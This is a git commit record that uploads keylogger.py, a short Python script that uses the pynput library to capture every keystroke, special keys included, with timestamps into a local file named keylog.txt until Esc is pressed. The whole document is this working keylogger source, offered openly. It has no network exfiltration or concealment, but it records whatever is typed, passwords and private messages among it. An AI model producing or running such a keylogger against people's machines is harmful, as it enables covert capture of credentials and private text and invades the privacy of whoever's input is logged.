47650408504a05ef9bd56c185b579f40dc740f6d
getproject92 <getproject92@gmail.com>
2025-04-24 21:57:33 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,21 @@
+from pynput import keyboard
+import logging
+
+# Configure logging
+logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+
+STOP_KEY = keyboard.Key.esc
+
+def on_press(key):
+    try:
+        logging.info(f"Key pressed: {key.char}")
+    except AttributeError:
+        logging.info(f"Special key pressed: {key}")
+
+    
+    if key == STOP_KEY:
+        return False  
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
